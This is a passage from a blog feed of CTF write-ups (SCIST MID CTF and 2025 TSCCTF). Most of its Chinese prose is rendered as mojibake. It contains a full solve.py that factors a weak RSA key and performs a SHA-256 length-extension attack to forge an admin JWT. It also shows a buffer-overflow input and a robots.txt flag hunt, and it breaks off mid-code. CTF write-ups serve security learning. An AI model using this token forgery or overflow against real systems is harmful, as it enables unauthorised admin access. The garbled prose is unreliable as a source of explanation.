å…¶ä¸­<code>secret</code> çš„é•·åº¦åªæœ‰å¯èƒ½æ˜¯ 37~43 å°±ä¸€ç›´çŒœå°±æœƒå°äº†</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    a, b = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, b, n)</span><br><span class="line">        p = GCD(a - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">        b += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    a = gmpy2.isqrt(n) + <span class="number">1</span></span><br><span class="line">    b = a ** <span class="number">2</span> - n</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b = a ** <span class="number">2</span> - n</span><br><span class="line">    b = gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (a + b, a - b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_encode</span>(<span class="params">data</span>):</span><br><span class="line">    data = base64.b64encode(data).decode()</span><br><span class="line">    data = data.replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>)</span><br><span class="line">    <span class="keyword">return</span> data.rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_decode</span>(<span class="params">data</span>):</span><br><span class="line">    data = data.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</span><br><span class="line">    data = data + <span class="string">"="</span> * (-<span class="built_in">len</span>(data) % <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(data.encode())</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"n: "</span>))</span><br><span class="line"></span><br><span class="line">p = pollard(n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"p: <span class="subst">{p}</span>"</span>)</span><br><span class="line"></span><br><span class="line">q, r = fermat(n//p)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"d: <span class="subst">{d}</span>"</span>)</span><br><span class="line"></span><br><span class="line">ori_token = <span class="built_in">input</span>(<span class="string">"ori_token: "</span>).split(<span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line">ori_header = new_decode(ori_token[<span class="number">0</span>])</span><br><span class="line">ori_body = new_decode(ori_token[<span class="number">1</span>])</span><br><span class="line">ori_sig = new_decode(ori_token[<span class="number">2</span>])</span><br><span class="line">message = ori_header + <span class="string">b"."</span> + ori_body</span><br><span class="line">hash_ori = long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(ori_sig), e, n))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"message: <span class="subst">{message}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ori_sig: <span class="subst">{ori_sig}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"hash_ori: <span class="subst">{hash_ori}</span>"</span>)</span><br><span class="line"></span><br><span class="line">secret_length = <span class="number">39</span> <span class="comment"># guess 37 ~ 43</span></span><br><span class="line">append_data = <span class="string">b'&amp;admin=Y&amp;iat=1839001735'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### LEA ######</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rightrotate</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">32</span> - n))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHA256</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, state=<span class="literal">None</span>, count=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        state: 8å€‹ 32 ä½å…ƒæ•´æ•¸ï¼Œè¡¨ç¤º SHA256 çš„ä¸­é–“ç‹€æ…‹</span></span><br><span class="line"><span class="string">        count: å·²è™•ç†çš„ä½å…ƒçµ„æ•¸ï¼ˆä¸åŒ…å«ç›®å‰å°šæœªè™•ç†çš„è³‡æ–™ï¼‰</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> state <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># SHA256 çš„åˆå§‹å‘é‡ IV</span></span><br><span class="line">            <span class="variable language_">self</span>.h = [</span><br><span class="line">                <span class="number">0x6a09e667</span>,</span><br><span class="line">                <span class="number">0xbb67ae85</span>,</span><br><span class="line">                <span class="number">0x3c6ef372</span>,</span><br><span class="line">                <span class="number">0xa54ff53a</span>,</span><br><span class="line">                <span class="number">0x510e527f</span>,</span><br><span class="line">                <span class="number">0x9b05688c</span>,</span><br><span class="line">                <span class="number">0x1f83d9ab</span>,</span><br><span class="line">                <span class="number">0x5be0cd19</span>,</span><br><span class="line">            ]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.h = state[:]  <span class="comment"># è¤‡è£½ä¸€ä»½ç‹€æ…‹</span></span><br><span class="line">        <span class="variable language_">self</span>.unprocessed = <span class="string">b''</span></span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length = count</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.unprocessed += data</span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length += <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.unprocessed) &gt;= <span class="number">64</span>:</span><br><span class="line">            <span class="variable language_">self</span>._handle(<span class="variable language_">self</span>.unprocessed[:<span class="number">64</span>])</span><br><span class="line">            <span class="variable language_">self</span>.unprocessed = <span class="variable language_">self</span>.unprocessed[<span class="number">64</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle</span>(<span class="params">self, chunk</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(chunk) == <span class="number">64</span></span><br><span class="line">        w = <span class="built_in">list</span>(struct.unpack(<span class="string">'&gt;16L'</span>, chunk))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="number">64</span>):</span><br><span class="line">            s0 = rightrotate(w[i-<span class="number">15</span>], <span class="number">7</span>) ^ rightrotate(w[i-<span class="number">15</span>], <span class="number">18</span>) ^ (w[i-<span class="number">15</span>] &gt;&gt; <span class="number">3</span>)</span><br><span class="line">            s1 = rightrotate(w[i-<span class="number">2</span>], <span class="number">17</span>) ^ rightrotate(w[i-<span class="number">2</span>], <span class="number">19</span>) ^ (w[i-<span class="number">2</span>] &gt;&gt; <span class="number">10</span>)</span><br><span class="line">            w.append((w[i-<span class="number">16</span>] + s0 + w[i-<span class="number">7</span>] + s1) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        a, b, c, d, e, f, g, h_val = <span class="variable language_">self</span>.h</span><br><span class="line">        k = [</span><br><span class="line">            <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>,</span><br><span class="line">            <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,</span><br><span class="line">            <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>,</span><br><span class="line">            <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,</span><br><span class="line">            <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>,</span><br><span class="line">            <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,</span><br><span class="line">            <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>,</span><br><span class="line">            <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,</span><br><span class="line">            <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>,</span><br><span class="line">            <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,</span><br><span class="line">            <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>,</span><br><span class="line">            <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,</span><br><span class="line">            <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>,</span><br><span class="line">            <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,</span><br><span class="line">            <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>,</span><br><span class="line">            <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>,</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            s1 = rightrotate(e, <span class="number">6</span>) ^ rightrotate(e, <span class="number">11</span>) ^ rightrotate(e, <span class="number">25</span>)</span><br><span class="line">            ch = (e &amp; f) ^ ((~e) &amp; g)</span><br><span class="line">            temp1 = (h_val + s1 + ch + k[i] + w[i]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            s0 = rightrotate(a, <span class="number">2</span>) ^ rightrotate(a, <span class="number">13</span>) ^ rightrotate(a, <span class="number">22</span>)</span><br><span class="line">            maj = (a &amp; b) ^ (a &amp; c) ^ (b &amp; c)</span><br><span class="line">            temp2 = (s0 + maj) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">            h_val = g</span><br><span class="line">            g = f</span><br><span class="line">            f = e</span><br><span class="line">            e = (d + temp1) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            d = c</span><br><span class="line">            c = b</span><br><span class="line">            b = a</span><br><span class="line">            a = (temp1 + temp2) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">0</span>] = (<span class="variable language_">self</span>.h[<span class="number">0</span>] + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">1</span>] = (<span class="variable language_">self</span>.h[<span class="number">1</span>] + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">2</span>] = (<span class="variable language_">self</span>.h[<span class="number">2</span>] + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">3</span>] = (<span class="variable language_">self</span>.h[<span class="number">3</span>] + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">4</span>] = (<span class="variable language_">self</span>.h[<span class="number">4</span>] + e) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">5</span>] = (<span class="variable language_">self</span>.h[<span class="number">5</span>] + f) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">6</span>] = (<span class="variable language_">self</span>.h[<span class="number">6</span>] + g) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">7</span>] = (<span class="variable language_">self</span>.h[<span class="number">7</span>] + h_val) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># æ ¹æ“š SHA256 è¦ç¯„é€²è¡Œå¡«å……ï¼šå…ˆåŠ ä¸Š 0x80ï¼Œå†è£œ 0x00 è‡³é•·åº¦ mod 64 ç‚º 56ï¼Œæœ€å¾ŒåŠ ä¸Š 8 å­—ç¯€çš„ä½å…ƒé•·åº¦</span></span><br><span class="line">        ml = <span class="variable language_">self</span>.message_byte_length * <span class="number">8</span></span><br><span class="line">        pad = <span class="string">b'\x80'</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable language_">self</span>.message_byte_length + <span class="built_in">len</span>(pad)) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">            pad += <span class="string">b'\x00'</span></span><br><span class="line">        pad += struct.pack(<span class="string">'&gt;Q'</span>, ml)</span><br><span class="line">        <span class="keyword">return</span> pad</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">digest</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># æš«å­˜ç›®å‰ç‹€æ…‹</span></span><br><span class="line">        h_backup = <span class="variable language_">self</span>.h[:]</span><br><span class="line">        unprocessed_backup = <span class="variable language_">self</span>.unprocessed</span><br><span class="line">        message_byte_length_backup = <span class="variable language_">self</span>.message_byte_length</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.update(<span class="variable language_">self</span>._padding())</span><br><span class="line">        result = <span class="string">b''</span>.join(struct.pack(<span class="string">'&gt;I'</span>, h) <span class="keyword">for</span> h <span class="keyword">in</span> <span class="variable language_">self</span>.h)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># é‚„åŸç‹€æ…‹</span></span><br><span class="line">        <span class="variable language_">self</span>.h = h_backup</span><br><span class="line">        <span class="variable language_">self</span>.unprocessed = unprocessed_backup</span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length = message_byte_length_backup</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ml = secret_length + <span class="built_in">len</span>(message)</span><br><span class="line">glue_padding = <span class="string">b'\x80'</span></span><br><span class="line"><span class="keyword">while</span> (ml + <span class="built_in">len</span>(glue_padding)) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">    glue_padding += <span class="string">b'\x00'</span></span><br><span class="line">glue_padding += (ml * <span class="number">8</span>).to_bytes(<span class="number">8</span>, <span class="string">'big'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Glue padding (hex):"</span>, glue_padding.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">new_message = message + glue_padding + append_data</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"New message:"</span>, new_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. ä½¿ç”¨è‡ªè¨‚ SHA256 é€²è¡Œé•·åº¦å»¶å±•æ”»æ“Š</span></span><br><span class="line"><span class="comment"># åˆå§‹å·²è™•ç†ä½å…ƒçµ„æ•¸ï¼šsecret + message + glue_padding</span></span><br><span class="line">initial_count = secret_length + <span class="built_in">len</span>(message) + <span class="built_in">len</span>(glue_padding)</span><br><span class="line"><span class="comment"># å°‡åŸå§‹ hash è½‰æ›ç‚ºåˆå§‹ç‹€æ…‹ï¼ˆ8 å€‹ 32 ä½å…ƒæ•´æ•¸ï¼‰</span></span><br><span class="line">h = [<span class="built_in">int</span>.from_bytes(hash_ori[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">'big'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">sha = SHA256(state=h, count=initial_count)</span><br><span class="line">sha.update(append_data)</span><br><span class="line">new_hash_extension = sha.digest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"New hash (extension attack):"</span>, new_hash_extension)</span><br><span class="line"></span><br><span class="line">new_sig = long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(new_hash_extension), d, n))</span><br><span class="line"></span><br><span class="line">new_body = new_message.split(<span class="string">b"."</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"token:"</span> + new_encode(ori_header) + <span class="string">"."</span> + new_encode(new_body) + <span class="string">"."</span> + new_encode(new_sig))</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/JNBweOL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>flag:<code>SCIST{It's a bad practice to implement RS256 of JWT.}</code></p><p>P.S. ç‚ºä»€éº¼æ‰¾ä¸åˆ°ç¶²è·¯ä¸Šå¯ä»¥ç”¨ä¾†è§£ sha256 LEAçš„å·¥å…·æˆ–æ˜¯è…³æœ¬å•Šå•Šå•Šï¼Œ<del>å…¶å¯¦ LEA é‚£éƒ¨ä»½ä¸»è¦æ˜¯è© å”±å‡ºä¾†çš„</del></p><h2 id="welcome">Welcome <a href="#welcome" class="headerlink"></a></h2><h3 id="catch-the-flag">CATCH THE FLAG! <a href="#catch-the-flag" class="headerlink"></a></h3><p>åœ¨é¦–é çš„ console çœ‹åˆ°</p><figure><img data-src="https://i.imgur.com/Y91Vjo0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åˆ° <code>[robots.txt](https://mid.ctf.scist.org/robots.txt)</code>çœ‹åˆ°</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow:/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==</span><br></pre></td></tr></tbody></table></figure><p>é€²åˆ° <code>/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==</code> ç™¼ç¾</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">"E.1O9_w3lc0mE}"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>æ‰¾åˆ°ç¬¬äºŒæ®µ flag <code>E.1O9_w3lc0mE}</code> ï¼Œå°±æˆåŠŸã„Œ</p><p>flag: <code>SCIST{c0Ns01E.1O9_w3lc0mE}</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;scist-mid-ctf-writeup&quot;&gt;SCIST MID CTF Writeup &lt;a href=&quot;#scist-mid-ctf-writeup&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/I5lei4J.png&quot; alt=&quot;Image&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Image&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;æˆ‘æ˜¯ SCIST_31 /&lt;/p&gt;</summary>
    
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="TSCCTF" scheme="https://moon-jam.me/tags/TSCCTF/"/>
    
    <category term="Writeup" scheme="https://moon-jam.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2025 TSCCTF Writeup</title>
    <link href="https://moon-jam.me/2025_TSCCTF_Writeup/"/>
    <id>https://moon-jam.me/2025_TSCCTF_Writeup/</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.304Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ Qualified Scoreboard ç¬¬äº”ï¼Œå…¨éƒ¨äººçš„ç¬¬ 41ï¼Œå—šå—šè¢«è™çˆ›äº†</p><figure><img data-src="https://i.imgur.com/IGyLku7.png" alt="Qualified Scoreboard"><figcaption aria-hidden="true">Qualified Scoreboard</figcaption></figure><figure><img data-src="https://i.imgur.com/bImlzwR.png" alt="Overall Scoreboard"><figcaption aria-hidden="true">Overall Scoreboard</figcaption></figure><span id="more"></span><h2 id="welcome">Welcome <a href="#welcome" class="headerlink"></a></h2><h3 id="give-you-a-free-flag">Give you a free flag <a href="#give-you-a-free-flag" class="headerlink"></a></h3><p>æŠŠåº•ä¸‹åç™½å°±å‡ºç¾äº†</p><figure><img data-src="https://hackmd.io/_uploads/rkot-bzwyx.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{W3llc0me_t0_TSC2O2SIlIllI}</code></p><h3 id="please-join-our-discord">Please Join Our Discord!!! <a href="#please-join-our-discord" class="headerlink"></a></h3><p>åœ¨ DC ç¿»ä¸€ç¿»å°±æ‰¾åˆ°äº† OuO ä½†æˆ‘çœ‹åˆ°å»å¹´çš„äº¤äº†å¤§æ¦‚ 20 å¹¾ç­†éŒ¯çš„ flagw</p><figure><img data-src="https://hackmd.io/_uploads/rJoFoSfPyl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{w31c0m3_t0_t5cc7f2025_d15c0rd!!!}</code></p><h3 id="feedback-form">Feedback Form <a href="#feedback-form" class="headerlink"></a></h3><p>å°±å¡«è¡¨å–®</p><figure><img data-src="https://hackmd.io/_uploads/SJO9i1UPyx.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{thanks_for_playing_and_c_u_nexy_year!}</code></p><h2 id="pwn">Pwn <a href="#pwn" class="headerlink"></a></h2><h3 id="gamble_bad_bad">gamble_bad_bad <a href="#gamble_bad_bad" class="headerlink"></a></h3><p>ç‚ºäº†è®“ <code>strcmp(game.jackpot_value, "777") == 0</code> æˆç«‹ï¼Œç”¨Buffer Overflow</p><p>è¼¸å…¥: <code>AAAAAAAAAAAAAAAAAAAA777</code></p><p>flag: <code>TSC{Gamb1e_Very_bad_bad_but_}</code></p><h2 id="crypto">Crypto <a href="#crypto" class="headerlink"></a></h2><h3 id="very-simple-login">Very Simple Login <a href="#very-simple-login" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 